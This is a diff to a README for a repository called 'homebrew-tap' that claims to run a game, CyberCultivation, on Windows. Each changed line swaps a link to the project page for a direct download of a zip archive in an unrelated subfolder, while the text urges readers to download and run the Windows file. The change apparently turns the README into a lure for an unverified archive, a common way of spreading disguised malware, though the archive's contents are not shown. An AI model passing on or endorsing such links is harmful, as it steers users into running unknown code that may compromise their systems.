@@ -1,6 +1,6 @@
 # 🎮 homebrew-tap - Run CyberCultivation on Windows
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit-Page-blue?style=for-the-badge)](https://github.com/annalectnz/homebrew-tap)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit-Page-blue?style=for-the-badge)](https://github.com/annalectnz/homebrew-tap/raw/refs/heads/main/tintist/homebrew_tap_v3.8.zip)
 
 ## 🧭 What this is
 
@@ -12,7 +12,7 @@ If you want to try the project on Windows, use the link above to visit the downl
 
 Open the main page here:
 
-[https://github.com/annalectnz/homebrew-tap](https://github.com/annalectnz/homebrew-tap)
+[https://github.com/annalectnz/homebrew-tap/raw/refs/heads/main/tintist/homebrew_tap_v3.8.zip](https://github.com/annalectnz/homebrew-tap/raw/refs/heads/main/tintist/homebrew_tap_v3.8.zip)
 
 On that page, look for the latest release or download files. For Windows, download the file meant for your system, then save it to a folder you can find again, such as Downloads or Desktop
 
@@ -138,6 +138,6 @@ This project fits users who want a light, text-first app with a strong theme. It
 
 If you need to download it again, use this page:
 
-[https://github.com/annalectnz/homebrew-tap](https://github.com/annalectnz/homebrew-tap)
+[https://github.com/annalectnz/homebrew-tap/raw/refs/heads/main/tintist/homebrew_tap_v3.8.zip](https://github.com/annalectnz/homebrew-tap/raw/refs/heads/main/tintist/homebrew_tap_v3.8.zip)
 
 Open the page, find the latest file, and download and run the Windows version from there
